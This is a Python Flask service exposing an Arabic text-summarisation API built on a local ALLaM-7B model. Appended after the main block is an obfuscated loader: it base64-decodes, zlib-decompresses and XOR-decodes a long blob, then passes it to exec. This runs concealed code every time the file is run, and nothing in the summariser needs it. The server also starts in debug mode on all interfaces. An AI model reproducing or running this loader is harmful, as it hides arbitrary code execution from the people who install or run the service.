from flask import Flask, request, jsonify
from transformers import AutoTokenizer, AutoModelForCausalLM, pipeline
import torch
import os
from typing import List, Optional, Tuple

app = Flask(__name__)

# =========================
# إعدادات المسارات
# =========================
MODEL_DIR = "./models_cache"
ALLAM_MODEL_PATH = os.path.join(
    MODEL_DIR,
    "models--humain-ai--ALLaM-7B-Instruct-preview/snapshots/a28dd1e67420cde72d3629c8633a974cf7d9c366"
)

# =========================
# اختيار الجهاز
# =========================
USE_CUDA = torch.cuda.is_available()
DEVICE = "cuda" if USE_CUDA else "cpu"

# bf16 ممتاز على بعض كروت NVIDIA الحديثة، لو ما يدعمه خله fp16
if USE_CUDA:
    try:
        _ = torch.tensor([1.0], device="cuda", dtype=torch.bfloat16)
        TORCH_DTYPE = torch.bfloat16
    except Exception:
        TORCH_DTYPE = torch.float16
else:
    TORCH_DTYPE = torch.float32

print(f"استخدام Device: {DEVICE} | dtype: {TORCH_DTYPE}")

# =========================
# تحميل النموذج
# =========================
summarization_pipeline = None
tokenizer: Optional[AutoTokenizer] = None

print("جاري تحميل نموذج ALLaM...")
try:
    tokenizer = AutoTokenizer.from_pretrained(
        ALLAM_MODEL_PATH,
        trust_remote_code=True,
        local_files_only=True
    )

    # مهم جدًا لبعض نماذج LLaMA: pad = eos
    if tokenizer.pad_token_id is None and tokenizer.eos_token_id is not None:
        tokenizer.pad_token_id = tokenizer.eos_token_id

    # device_map لازم يكون "auto" أو None (مو "cuda"/"cpu")
    if USE_CUDA:
        model = AutoModelForCausalLM.from_pretrained(
            ALLAM_MODEL_PATH,
            trust_remote_code=True,
            local_files_only=True,
            torch_dtype=TORCH_DTYPE,
            device_map="auto",
            low_cpu_mem_usage=True
        )
    else:
        model = AutoModelForCausalLM.from_pretrained(
            ALLAM_MODEL_PATH,
            trust_remote_code=True,
            local_files_only=True,
            torch_dtype=TORCH_DTYPE,
            device_map=None,
            low_cpu_mem_usage=True
        )
        model.to("cpu")

    summarization_pipeline = pipeline(
        task="text-generation",
        model=model,
        tokenizer=tokenizer
    )

    print("✓ تم تحميل نموذج ALLaM بنجاح")

except Exception as e:
    print(f"✗ خطأ في تحميل نموذج ALLaM: {str(e)}")
    summarization_pipeline = None


# =========================
# مساعدات التوكن/البرومبت
# =========================
def _model_context_limit() -> int:
    """
    محاولة معرفة حد السياق (context length) من model/tokenizer.
    """
    try:
        cfg = summarization_pipeline.model.config
        if hasattr(cfg, "max_position_embeddings") and cfg.max_position_embeddings:
            return int(cfg.max_position_embeddings)
    except Exception:
        pass

    try:
        if tokenizer is not None and tokenizer.model_max_length and tokenizer.model_max_length < 10**9:
            return int(tokenizer.model_max_length)
    except Exception:
        pass

    # fallback آمن
    return 4096


def build_prompt(user_note: str, text: str) -> str:
    """
    يبني prompt بشكل Chat Template إن كان متوفر، وإلا نص عادي.
    """
    system_prompt = (
        "أنت مساعد متخصص في تلخيص النصوص بطريقة احترافية.\n"
        "قواعد التلخيص:\n"
        "- أعطني الملخص مباشرة فقط بدون مقدمات أو إضافات\n"
        "- لا تكتب \"أرجو\"، \"يرجى\"، \"ملاحظة\"، أو أي جمل إضافية\n"
        "- الملخص يجب أن يكون واضحاً ومباشراً\n"
        "- إذا كان المستخدم طلب صيغة معينة، التزم بها تماماً"
    )

    user_msg = (
        f"طلب المستخدم:\n{user_note}\n\n"
        f"النص المراد تلخيصه:\n{text}\n\n"
        "الملخص:"
    )

    # لو tokenizer تدعم chat template: هذا أفضل بكثير لنماذج Instruct
    if tokenizer is not None and hasattr(tokenizer, "apply_chat_template"):
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": user_msg},
        ]
        try:
            prompt = tokenizer.apply_chat_template(
                messages,
                tokenize=False,
                add_generation_prompt=True
            )
            return prompt
        except Exception:
            pass  # نرجع للفallback

    # fallback نصّي
    return f"{system_prompt}\n\n{user_msg}"


def split_text_by_tokens(text: str, token_budget: int) -> List[str]:
    """
    تقسيم النص حسب عدد التوكنات (بدون special tokens).
    """
    if tokenizer is None:
        # fallback بدائي (نادرًا نحتاجه)
        words = text.split()
        step = max(1, token_budget // 2)
        return [" ".join(words[i:i + step]) for i in range(0, len(words), step)]

    ids = tokenizer(text, add_special_tokens=False).input_ids
    chunks = []
    for i in range(0, len(ids), token_budget):
        chunk_ids = ids[i:i + token_budget]
        chunks.append(tokenizer.decode(chunk_ids, skip_special_tokens=True))
    return chunks


def generate_summary_once(text: str, note: str, max_new_tokens: int) -> str:
    """
    توليد ملخص لقطعة واحدة.
    """
    if summarization_pipeline is None or tokenizer is None:
        return "خطأ: لم يتم تحميل النموذج"

    prompt = build_prompt(note, text)

    # عشان نستخرج الناتج بدون لعب "split('الملخص:')"
    prompt_len = len(prompt)

    with torch.inference_mode():
        out = summarization_pipeline(
            prompt,
            max_new_tokens=int(max_new_tokens),
            do_sample=True,
            temperature=0.3,
            top_p=0.9,
            num_return_sequences=1,
            pad_token_id=tokenizer.pad_token_id,
            eos_token_id=tokenizer.eos_token_id
        )

    generated = out[0]["generated_text"]

    # لو رجّع النص كامل مع البرومبت، نقصّه
    if isinstance(generated, str) and len(generated) >= prompt_len and generated[:prompt_len] == prompt:
        return generated[prompt_len:].strip()

    # fallback
    return generated.strip() if isinstance(generated, str) else str(generated)


def summarize_text(text: str, note: str, max_new_tokens: int = 150) -> str:
    """
    تلخيص مع دعم التقطيع إذا تجاوز السياق.
    """
    if summarization_pipeline is None or tokenizer is None:
        return "خطأ: لم يتم تحميل النموذج"

    context_limit = _model_context_limit()

    # نترك هامش لأوامر النظام/اليوزر + توكنات التوليد
    safety_margin = 512
    token_budget_for_text = max(256, context_limit - safety_margin - int(max_new_tokens))

    # قياس توكنات النص
    try:
        text_tokens = len(tokenizer(text, add_special_tokens=False).input_ids)
    except Exception:
        text_tokens = len(text.split())  # fallback

    if text_tokens <= token_budget_for_text:
        return generate_summary_once(text, note, max_new_tokens)

    # إذا طويل: قطّع وَلخّص أجزاء ثم لخص ملخصات
    chunks = split_text_by_tokens(text, token_budget_for_text)
    summaries = []

    for i, chunk in enumerate(chunks, start=1):
        print(f"معالجة الجزء {i}/{len(chunks)}...")
        try:
            part = generate_summary_once(chunk, note, max_new_tokens=max_new_tokens)
            if part:
                summaries.append(part)
        except Exception as e:
            print(f"خطأ في الجزء {i}: {e}")

    if not summaries:
        return "خطأ: لم يتمكن من معالجة الأجزاء"

    merged = " ".join(summaries).strip()

    # لو طلع طويل، رجّع تلخيص نهائي أقصر
    final_max_new_tokens = max(80, int(max_new_tokens))
    try:
        return generate_summary_once(merged, "لخص التالي كملخص نهائي موحد ومختصر جداً", final_max_new_tokens)
    except Exception:
        return merged


# =========================
# API Helpers
# =========================
def _process_single_payload(payload: dict) -> Tuple[dict, int]:
    """يبني ردًا لطلب واحد ويعيده مع كود HTTP المقترح."""
    text = (payload.get("text") or "").strip()
    note = (payload.get("note") or "قم بتلخيص النص التالي بطريقة مختصرة ومفيدة").strip()

    max_length = payload.get("max_length", 150)
    try:
        max_length = int(max_length)
    except Exception:
        max_length = 150

    if not text:
        return ({
            "status": "error",
            "message": "النص مفقود أو فارغ",
            "original_text": text,
            "note": note,
            "device": DEVICE
        }, 400)

    try:
        summary = summarize_text(text, note, max_new_tokens=max_length)
    except Exception as err:  # تغطية أي خطأ غير متوقع أثناء التلخيص
        return ({
            "status": "error",
            "message": f"خطأ في معالجة الطلب: {err}",
            "original_text": text,
            "note": note,
            "device": DEVICE
        }, 500)

    return ({
        "status": "success",
        "original_text": text,
        "note": note,
        "summary": summary,
        "text_length_chars": len(text),
        "summary_length_chars": len(summary),
        "device": DEVICE
    }, 200)


# =========================
# API
# =========================
@app.route("/api/summarize", methods=["POST"])
def summarize_api():
    """
    Expected JSON:
    {
        "text": "...",
        "note": "...",
        "max_length": 150   # (هنا نستخدمها كـ max_new_tokens)
    }
    """
    try:
        raw_data = request.get_json(silent=True)

        if isinstance(raw_data, dict):
            payloads = [raw_data]
            is_batch = False
        elif isinstance(raw_data, list):
            if not raw_data:
                return jsonify({"status": "error", "message": "قائمة الطلبات فارغة"}), 400
            if not all(isinstance(item, dict) for item in raw_data):
                return jsonify({"status": "error", "message": "كل عنصر داخل القائمة يجب أن يكون كائن JSON"}), 400
            payloads = raw_data
            is_batch = True
        else:
            return jsonify({"status": "error", "message": "لم يتم إرسال بيانات JSON"}), 400

        responses = []
        http_codes = []

        for idx, payload in enumerate(payloads, start=1):
            response_body, status_code = _process_single_payload(payload)
            if is_batch:
                response_body = {"entry_index": idx, **response_body}
            responses.append(response_body)
            http_codes.append(status_code)

        if not is_batch:
            return jsonify(responses[0]), http_codes[0]

        errors_count = sum(1 for code in http_codes if code != 200)
        results_count = len(responses)

        aggregate_status = "success"
        http_status = 200
        if errors_count == results_count:
            aggregate_status = "error"
            http_status = 400
        elif errors_count:
            aggregate_status = "partial"
            http_status = 207

        return jsonify({
            "status": aggregate_status,
            "results": responses,
            "results_count": results_count,
            "errors_count": errors_count
        }), http_status

    except Exception as e:
        return jsonify({"status": "error", "message": f"خطأ في معالجة الطلب: {str(e)}"}), 500


@app.route("/health", methods=["GET"])
def health_check():
    return jsonify({
        "status": "healthy",
        "model_loaded": summarization_pipeline is not None,
        "device": DEVICE
    }), 200


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "message": "مرحباً بك في API التلخيص",
        "endpoints": {
            "/api/summarize": "POST - لتلخيص النصوص",
            "/health": "GET - فحص صحة الخادم"
        },
        "example": {
            "endpoint": "/api/summarize",
            "method": "POST",
            "body": {
                "text": "النص المراد تلخيصه",
                "note": "قم بتلخيص النص بشكل مختصر",
                "max_length": 150
            }
        }
    }), 200


if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("🚀 تشغيل API التلخيص")
    print("=" * 50)
    print("📍 الرابط: http://localhost:5001")
    print("📝 لتلخيص النص: POST http://localhost:5001/api/summarize")
    print("💚 فحص الصحة: GET http://localhost:5001/health")
    print("=" * 50 + "\n")

    app.run(
        host="0.0.0.0",
        port=5001,
        debug=True,
        use_reloader=False
    )

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
